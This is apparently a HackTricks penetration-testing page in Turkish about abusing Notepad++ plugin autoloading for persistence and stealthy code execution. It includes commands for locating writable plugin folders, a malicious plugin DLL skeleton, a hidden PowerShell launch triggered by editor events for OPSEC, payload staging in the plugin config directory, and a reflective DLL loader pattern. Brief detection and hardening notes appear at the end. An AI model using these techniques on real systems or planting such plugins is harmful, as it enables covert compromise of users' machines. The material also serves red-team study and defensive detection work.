# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ başlatıldığında, `plugins` alt klasörlerinde bulunan **her plugin DLL'ini otomatik olarak yükler**. Kötü amaçlı bir plugin'i **yazılabilir herhangi bir Notepad++ kurulumuna** bırakmak, editör her başlatıldığında `notepad++.exe` içinde kod çalıştırılmasını sağlar. Bu durum **persistence**, gizli **initial execution** veya editör yükseltilmiş yetkilerle başlatılmışsa **in-process loader** olarak kötüye kullanılabilir.<sup>[[1]](#references)</sup>

**Notepad++ 7.6+** sürümlerinden itibaren beklenen manuel kurulum düzeni, **plugin başına bir alt klasör** olacak şekildedir (`plugins\<PluginName>\<PluginName>.dll`). **Portable mode** etkin olduğunda (`notepad++.exe` dosyasının yanında `doLocalConf.xml` bulunur), tüm uygulama ağacı bu dizin içinde yerel olarak tutulur. Bu durum, kopyalanmış yönetici araç paketlerini genellikle kullanıcı tarafından yazılabilir kolay bir execution yüzeyine dönüştürür.<sup>[[2]](#references)</sup>

## Yazılabilir plugin konumları

- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (yazmak için genellikle admin yetkisi gerekir).<sup>[[1]](#references)</sup>
- Düşük yetkili operatörler için yazılabilir seçenekler:<sup>[[1]](#references)</sup>
- **Portable Notepad++ build** sürümünü kullanıcı tarafından yazılabilir bir klasörde kullanın.
- `C:\Program Files\Notepad++` dizinini kullanıcı tarafından kontrol edilen bir yola (ör. `%LOCALAPPDATA%\npp\`) kopyalayın ve `notepad++.exe` dosyasını buradan çalıştırın.
- Zaten `doLocalConf.xml` içeren ve `Program Files` dışında bulunan **admin tool bundles**, çıkarılmış zip kopyaları veya help-desk toolkit'lerini arayın.
- Her plugin, `plugins` altında kendi alt klasörüne sahip olur ve başlangıçta otomatik olarak yüklenir; menü girişleri **Plugins** altında görünür.<sup>[[2]](#references)</sup>

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ belirli **exported functions** bekler. Bunların tümü başlatma sırasında çağrılır ve birden fazla execution surface sağlar:<sup>[[1]](#references)</sup>
- **`DllMain`** — DLL yüklendiğinde hemen çalışır (ilk execution point).
- **`setInfo(NppData)`** — yükleme sırasında Notepad++ handle'larını sağlamak için bir kez çağrılır; menu öğelerini kaydetmek için tipik yerdir.
- **`getName()`** — menüde gösterilen plugin adını döndürür.
- **`getFuncsArray(int *nbF)`** — menu komutlarını döndürür; boş olsa bile startup sırasında çağrılır.
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla event'lerini alır (payload'ları bir user action veya editor event gerçekleşene kadar ertelemek için kullanışlıdır).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler; daha büyük veri alışverişleri için kullanışlıdır.
- **`isUnicode()`** — yükleme sırasında kontrol edilen compatibility flag.

Çoğu export **stub** olarak uygulanabilir; execution, autoload sırasında `DllMain` veya yukarıdaki callback'lerden herhangi biri üzerinden gerçekleşebilir.

## Minimal malicious plugin skeleton
Beklenen export'lara sahip bir DLL derleyin ve yazılabilir bir Notepad++ klasörü altındaki `plugins\\MyNewPlugin\\MyNewPlugin.dll` konumuna yerleştirin:<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL'yi derleyin (Visual Studio/MinGW).
2. `plugins` altında plugin alt klasörünü oluşturun ve DLL'yi içine bırakın.
3. Notepad++'ı yeniden başlatın; DLL otomatik olarak yüklenir, `DllMain` ve ardından gelen callback'leri çalıştırır.

## `beNotified` üzerinden düşük gürültülü tetikleme modeli
OPSEC için birçok payload **`DllMain` üzerinden tetiklenmemelidir**. Daha sessiz bir yöntem, plugin'in sorunsuz şekilde yüklenmesine izin vermek ve ardından yalnızca **başlangıcın tamamlanması**, **buffer aktivasyonu** veya **ilk yazılan karakter** gibi gerçekçi bir editor event'inden sonra çalıştırmaktır.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Bu, gürültülü bir `DllMain` beacon'ından ziyade public offensive research ile daha iyi örtüşür: DLL başlangıçta hâlâ autoload edilir, ancak malicious action yalnızca Notepad++ gerçekten kullanımda göründüğünde gerçekleştirilir.

## Plugin config directory'yi ikincil depolama olarak kullanma
Notepad++, **mevcut kullanıcının plugin configuration directory** yolunu döndüren `NPPM_GETPLUGINSCONFIGDIR` API'sini sunar.<sup>[[3]](#references)</sup> Malicious plugin, diskteki DLL'yi minimal tutarken encrypted config, staged payloads veya tasking files'ı normal plugin state ile uyumlu görünen bir path'te depolamak için bunu kullanabilir.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operasyonel olarak şu durumlarda kullanışlıdır:
- küçük bir autoloaded bootstrap DLL gerektiğinde;
- ana plugin binary'sine tekrar dokunmadan kullanıcı başına tasking gerektiğinde;
- **autoload trigger** ile daha ağır ikinci aşamayı ayırmak istediğinizde.

## Reflective loader plugin pattern
Weaponized bir plugin, Notepad++'ı **reflective DLL loader**'a dönüştürebilir:<sup>[[1]](#references)</sup>
- Minimal bir UI/menu girişi sunar (ör. "LoadDLL").
- Bir payload DLL'si almak için **file path** veya **URL** kabul eder.
- DLL'yi mevcut process içine reflective olarak map eder ve export edilmiş bir entry point'i (ör. alınan DLL içindeki bir loader function) çağırır.
- Avantaj: yeni bir loader spawn etmek yerine benign görünen bir GUI process yeniden kullanılır; payload, `notepad++.exe`'nin integrity seviyesini devralır (elevated context'ler dahil).
- Dezavantajlar: diske **unsigned plugin DLL** bırakmak gürültülüdür; pratik bir varyasyon, autoloaded plugin'i yalnızca stub olarak kullanmak ve gerçek implant'ı başka bir yerde encrypted/staged halde tutmaktır.

## Detection and hardening notes
- **Notepad++ plugin directories**'lerine yapılan yazma işlemlerini engelleyin veya izleyin (kullanıcı profillerindeki portable kopyalar dahil); controlled folder access veya application allowlisting'i etkinleştirin.
- `plugins` altında **new unsigned DLLs**, portable Notepad++ ağaçlarındaki değişiklikler ve `notepad++.exe` kaynaklı olağandışı **child processes/network activity** için alert oluşturun.
- Meşru plugin'lerin baseline'ını oluşturun ve normal Notepad++ plugin interface'ini export eden, ancak aynı zamanda shell'ler, PowerShell veya network beacon'ları spawn eden yeni DLL'leri araştırın.
- Plugin installation işlemini yalnızca **Plugins Admin** üzerinden yapılacak şekilde zorunlu kılın ve portable kopyaların untrusted path'lerden çalıştırılmasını kısıtlayın.

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
